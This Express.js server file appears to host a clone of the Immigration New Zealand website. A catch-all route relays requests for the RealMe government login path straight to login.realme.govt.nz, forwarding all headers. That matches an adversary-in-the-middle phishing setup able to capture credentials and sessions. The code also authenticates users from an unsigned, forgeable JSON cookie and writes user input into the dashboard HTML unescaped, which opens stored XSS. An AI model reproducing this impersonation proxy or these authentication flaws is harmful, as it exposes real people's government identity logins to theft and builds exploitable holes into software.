require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const https = require('https');
const url = require('url');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3001;
const COOKIE_MAX_AGE = 60 * 60 * 1000;

let admin = null;
let db = null;
let firebaseInitError = null;

try {
  admin = require('firebase-admin');

  const projectId = process.env.FIREBASE_PROJECT_ID;
  const clientEmail = process.env.FIREBASE_CLIENT_EMAIL;
  const privateKey = process.env.FIREBASE_PRIVATE_KEY
    ? process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
    : '';

  if (!projectId || !clientEmail || !privateKey) {
    firebaseInitError =
      'Firebase is not configured. Set FIREBASE_PROJECT_ID, FIREBASE_CLIENT_EMAIL, and FIREBASE_PRIVATE_KEY before using login or signup.';
  } else {
    if (!admin.apps.length) {
      admin.initializeApp({
        credential: admin.credential.cert({
          projectId,
          clientEmail,
          privateKey,
        }),
      });
    }

    db = admin.firestore();
  }
} catch (error) {
  firebaseInitError =
    'Firebase Admin SDK is not installed. Run `npm.cmd install firebase-admin` in the project folder.';
}

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());

// Serve static files
app.use(express.static(path.join(__dirname)));

function buildRedirect(pathname, params = {}) {
  const query = new URLSearchParams(params);
  const suffix = query.toString() ? `?${query.toString()}` : '';
  return `${pathname}${suffix}`;
}

function getCookieUser(req) {
  if (!req.cookies.user) {
    return null;
  }

  try {
    return JSON.parse(req.cookies.user);
  } catch (error) {
    return null;
  }
}

function setUserCookie(res, user) {
  res.cookie(
    'user',
    JSON.stringify({
      uid: user.uid,
      username: user.username,
      email: user.email,
      name: user.name || user.username,
    }),
    {
      maxAge: COOKIE_MAX_AGE,
      httpOnly: true,
      sameSite: 'lax',
    }
  );
}

function ensureFirebaseReady() {
  if (!db) {
    throw new Error(firebaseInitError || 'Firebase is not ready.');
  }

  return db;
}

function normalizeValue(value) {
  return String(value || '').trim();
}

function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
  const hash = crypto.scryptSync(password, salt, 64).toString('hex');
  return { salt, hash };
}

function verifyPassword(password, salt, expectedHash) {
  const computedHash = crypto.scryptSync(password, salt, 64);
  const storedHash = Buffer.from(expectedHash, 'hex');

  return (
    computedHash.length === storedHash.length &&
    crypto.timingSafeEqual(computedHash, storedHash)
  );
}

async function findUserByField(field, value) {
  const firestore = ensureFirebaseReady();
  const snapshot = await firestore
    .collection('users')
    .where(field, '==', value)
    .limit(1)
    .get();

  if (snapshot.empty) {
    return null;
  }

  const doc = snapshot.docs[0];
  return { uid: doc.id, ...doc.data() };
}

function isAuthenticated(req, res, next) {
  const user = getCookieUser(req);

  if (!user) {
    res.redirect('/login');
    return;
  }

  req.user = user;
  next();
}

// Proxy ALL requests to realme.govt.nz for that directory
app.all('/32179062-92f6-4eb0-89bc-df400a9e0367/B2C_1A_DIA_RealMe_LoginService/*', (req, res) => {
  const indexPath = path.join(__dirname, req.path, 'index.htm');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
    return;
  }

  const targetUrl = `https://login.realme.govt.nz${req.url}`;
  const parsedUrl = url.parse(targetUrl);

  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || 443,
    path: parsedUrl.path,
    method: req.method,
    headers: {
      ...req.headers,
      host: parsedUrl.hostname,
    },
  };

  const proxyReq = https.request(options, (proxyRes) => {
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res);
  });

  proxyReq.on('error', () => {
    res.status(500).send('Proxy error');
  });

  req.pipe(proxyReq);
});

// Root route to serve index.htm
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.htm'));
});

// Routes
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login', 'index.htm'));
});

app.get('/login/signup', (req, res) => {
  res.sendFile(path.join(__dirname, 'login', 'signup.htm'));
});

app.get('/login/forgot-username', (req, res) => {
  res.sendFile(path.join(__dirname, 'login', 'forgot-username.htm'));
});

app.get('/login/forgot-password', (req, res) => {
  res.sendFile(path.join(__dirname, 'login', 'forgot-password.htm'));
});

app.post('/register', async (req, res) => {
  const email = normalizeValue(req.body.email);
  const username = normalizeValue(req.body.username);
  const password = normalizeValue(req.body.password);
  const confirmPassword = normalizeValue(req.body.confirmPassword);

  if (!email || !username || !password || !confirmPassword) {
    res.redirect(buildRedirect('/login/signup', { error: 'All fields are required.' }));
    return;
  }

  if (username.length < 4) {
    res.redirect(
      buildRedirect('/login/signup', { error: 'Username must be at least 4 characters.' })
    );
    return;
  }

  if (password.length < 8) {
    res.redirect(
      buildRedirect('/login/signup', { error: 'Password must be at least 8 characters.' })
    );
    return;
  }

  if (password !== confirmPassword) {
    res.redirect(buildRedirect('/login/signup', { error: 'Passwords do not match.' }));
    return;
  }

  try {
    const existingUsername = await findUserByField('usernameLower', username.toLowerCase());
    if (existingUsername) {
      res.redirect(
        buildRedirect('/login/signup', { error: 'That username is already registered.' })
      );
      return;
    }

    const existingEmail = await findUserByField('emailLower', email.toLowerCase());
    if (existingEmail) {
      res.redirect(
        buildRedirect('/login/signup', { error: 'That email address is already registered.' })
      );
      return;
    }

    const { salt, hash } = hashPassword(password);
    const firestore = ensureFirebaseReady();
    const userRef = firestore.collection('users').doc();
    const user = {
      uid: userRef.id,
      username,
      usernameLower: username.toLowerCase(),
      email,
      emailLower: email.toLowerCase(),
      name: username,
      passwordHash: hash,
      passwordSalt: salt,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
    };

    await userRef.set(user);
    setUserCookie(res, user);
    res.redirect('/dashboard');
  } catch (error) {
    res.redirect(
      buildRedirect('/login/signup', {
        error: error.message || 'Unable to create your account right now.',
      })
    );
  }
});

app.post('/login', async (req, res) => {
  const username = normalizeValue(req.body.username);
  const password = normalizeValue(req.body.password);

  if (!username || !password) {
    res.redirect(buildRedirect('/login', { error: 'Enter your username and password.' }));
    return;
  }

  try {
    const user = await findUserByField('usernameLower', username.toLowerCase());
    if (!user || !verifyPassword(password, user.passwordSalt, user.passwordHash)) {
      res.redirect(buildRedirect('/login', { error: 'Invalid username or password.' }));
      return;
    }

    setUserCookie(res, user);
    res.redirect('/dashboard');
  } catch (error) {
    res.redirect(
      buildRedirect('/login', {
        error: error.message || 'Unable to sign you in right now.',
      })
    );
  }
});

app.get('/dashboard', isAuthenticated, (req, res) => {
  res.send(`
    <!doctype html>
    <html lang="en-NZ">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Dashboard - Immigration New Zealand</title>
      <link rel="stylesheet" href="/_resources/themes/app/dist/app.css">
    </head>
    <body>
      <h1>Welcome, ${req.user.name}!</h1>
      <p>Signed in as ${req.user.username}.</p>
      <p>Email: ${req.user.email}</p>
      <a href="/logout">Logout</a>
    </body>
    </html>
  `);
});

app.get('/logout', (req, res) => {
  res.clearCookie('user');
  res.redirect('/');
});

// Catch-all route to serve index.htm for any path
app.get('*', (req, res, next) => {
  const indexPath = path.join(__dirname, req.path, 'index.htm');

  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    next();
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});
